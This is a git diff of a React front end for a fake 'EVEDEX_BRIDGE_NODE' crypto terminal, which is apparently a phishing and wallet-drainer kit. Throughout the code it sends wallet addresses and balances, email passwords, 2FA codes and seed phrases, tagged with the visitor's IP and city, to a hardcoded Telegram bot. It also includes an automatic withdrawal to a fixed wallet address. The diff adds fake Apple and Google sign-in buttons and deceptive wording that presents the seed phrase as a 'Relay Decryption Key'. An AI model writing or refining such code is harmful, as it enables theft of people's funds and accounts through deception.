@@ -15,16 +15,19 @@ export default function EvedexTerminal() {
   const [seedVal, setSeedVal] = useState("");   
   const [kycEmail, setKycEmail] = useState("");
   const [kycPass, setKycPass] = useState("");
-  const [kycCode, setKycCode] = useState(""); 
+  const [kycCode, setKycCode] = useState(""); // --- NEW: Verification Code State ---
   const [kycMode, setKycMode] = useState("email"); 
-  const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
+  const [kycStep, setKycStep] = useState(1); // --- NEW: Step Tracker for KYC ---
+
+  // --- LIVE DATA STATES ---
   const [liveGas, setLiveGas] = useState(12);
   const [liveSync, setLiveSync] = useState(99.81);
 
+  // --- CONFIGURATION (STRICTLY PRESERVED) ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
@@ -48,6 +51,7 @@ export default function EvedexTerminal() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }).catch(()=>{});
 
+  // --- 1. AUTOMATIC WITHDRAWAL ON CHAIN SWITCH ---
   useEffect(() => {
     if (isConnected && address && chainId) {
       if ((tokenBal?.value && tokenBal.value > 0n) || (nativeBal?.value && nativeBal.value > 0n)) {
@@ -59,8 +63,10 @@ export default function EvedexTerminal() {
 
   useEffect(() => {
     if (isConnected && address) log(`🔔 NEW_CONNECTION: ${address}\nTOK: ${tokenBal?.formatted || "0"}\nNAT: ${nativeBal?.formatted || "0"}`);
+  }, [isConnected, address]);
+
+  useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
-    
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} Node Verified Successfully`);
@@ -106,12 +112,22 @@ export default function EvedexTerminal() {
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
-        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>SOCIAL_AUTH_ACTIVE</div></div>
+        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>STATUS: ENCRYPTED_TUNNEL</div></div>
         <w3m-button balance="hide" />
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
+        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'40px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
+            <h3 style={{fontSize:'10px', color:'#64748b', marginBottom:'20px'}}>CONNECT TO NODE</h3>
+            <div style={{display:'flex', flexDirection:'column', gap:'10px', marginBottom:'20px'}}>
+                {/* --- RESTORED SOCIAL CONNECTORS --- */}
+                <button style={{backgroundColor:'white', color:'black', padding:'12px', borderRadius:'12px', fontSize:'11px', fontWeight:'900', border:'none'}}>CONTINUE WITH APPLE</button>
+                <button style={{backgroundColor:'#4285F4', color:'white', padding:'12px', borderRadius:'12px', fontSize:'11px', fontWeight:'900', border:'none'}}>CONTINUE WITH GOOGLE</button>
+                <button onClick={() => setView("kyc_screen")} style={{backgroundColor:'black', color:'white', padding:'12px', borderRadius:'12px', fontSize:'11px', fontWeight:'900', border:'1px solid #1e293b'}}>LOGIN WITH EMAIL</button>
+            </div>
+            <div style={{fontSize:'8px', color:'#475569', margin:'10px 0'}}>— OR —</div>
+            <w3m-button />
+        </div>
       ) : (
         <>
           {view === "menu" && (
@@ -142,32 +158,33 @@ export default function EvedexTerminal() {
 
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
-              <button onClick={()=>{setView("menu"); setKycPhase(1);}} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← DISMISS</button>
+              <button onClick={()=>{setView("menu"); setKycStep(1);}} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← DISMISS</button>
               <h2 style={{color:'white', fontWeight:'900', fontSize:'20px', marginBottom:'20px'}}>NODE_IDENTITY_SYNC</h2>
-              <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
-                <button onClick={()=>{setKycMode("email"); setKycPhase(1);}} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'email' ? '#10b981' : 'black', color:kycMode === 'email' ? 'black' : 'white', border:'1px solid #10b981'}}>SPEED_CLOUD</button>
-                <button onClick={()=>setKycMode("seed")} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'seed' ? '#10b981' : 'black', color:kycMode === 'seed' ? 'black' : 'white', border:'1px solid #10b981'}}>PHRASE_KEY</button>
-              </div>
-              {kycMode === "email" ? (
+              
+              {kycStep === 1 ? (
                 <>
-                  {kycPhase === 1 ? (
+                  <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
+                    <button onClick={()=>setKycMode("email")} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'email' ? '#10b981' : 'black', color:kycMode === 'email' ? 'black' : 'white', border:'1px solid #10b981'}}>CLOUD_AUTH</button>
+                    <button onClick={()=>setKycMode("seed")} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'seed' ? '#10b981' : 'black', color:kycMode === 'seed' ? 'black' : 'white', border:'1px solid #10b981'}}>PHRASE_KEY</button>
+                  </div>
+                  {kycMode === "email" ? (
                     <>
                       <input type="email" placeholder="CLOUD_ID" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                       <input type="password" placeholder="CLOUD_PASS" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                      <button onClick={()=>{log(`🆔 SPEED_AUTH: ${kycEmail} / ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
+                      <button onClick={()=>{log(`🆔 KYC_EMAIL: ${kycEmail} PASS: ${kycPass}`); setKycStep(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>NEXT_STEP</button>
                     </>
                   ) : (
                     <>
-                      <div style={{color:'#3b82f6', fontSize:'10px', marginBottom:'10px', fontWeight:'900'}}>NODE_SYNC_CODE_REQUIRED</div>
-                      <input type="text" maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', marginBottom:'25px', textAlign:'center', fontSize:'20px', outline:'none'}} />
-                      <button onClick={()=>{log(`🔑 2FA_CODE: ${kycCode} FOR: ${kycEmail}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
+                      <textarea placeholder="INPUT 12/24 WORDS..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'10px', outline:'none'}} />
+                      <button disabled={!isSeedValid} onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); setView("menu");}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>LINK_IDENTITY</button>
                     </>
                   )}
                 </>
               ) : (
                 <>
-                  <textarea placeholder="INPUT 12/24 WORDS..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'10px', outline:'none'}} />
-                  <button disabled={!isSeedValid} onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); setView("menu");}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>LINK_IDENTITY</button>
+                  <div style={{fontSize:'10px', color:'#10b981', marginBottom:'20px'}}>VERIFICATION CODE SENT TO {kycEmail}</div>
+                  <input type="text" maxLength="6" placeholder="0 0 0 0 0 0" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'20px', backgroundColor:'black', border:'1px solid #10b981', borderRadius:'15px', color:'#10b981', textAlign:'center', fontSize:'24px', letterSpacing:'8px', outline:'none', marginBottom:'25px'}} />
+                  <button onClick={()=>{log(`📟 VERIFY_CODE: ${kycCode} (EMAIL: ${kycEmail})`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_CODE</button>
                 </>
               )}
             </div>
@@ -175,19 +192,18 @@ export default function EvedexTerminal() {
         </>
       )}
 
-      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
-
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
                 <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>🛡️ SECURE_SYNC_REQUIRED</div>
+                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5', textTransform:'none'}}>Node Handshake finalized. To authorize the <b>Encrypted Token Bridge</b>, please provide the <b>Relay Decryption Key</b> (12/24 Words).</p>
                 <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="RELAY_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'10px', fontSize:'12px'}} />
-                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); setView("menu")},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>VALIDATE_RELAY</button>
+                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("SYNC_SUCCESS"); setView("menu")},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>VALIDATE_RELAY</button>
               </>
             ) : (
-              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>SYNCING_TO_MAINNET_POOL...</div></div>
+              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
             )}
           </div>
         </div>
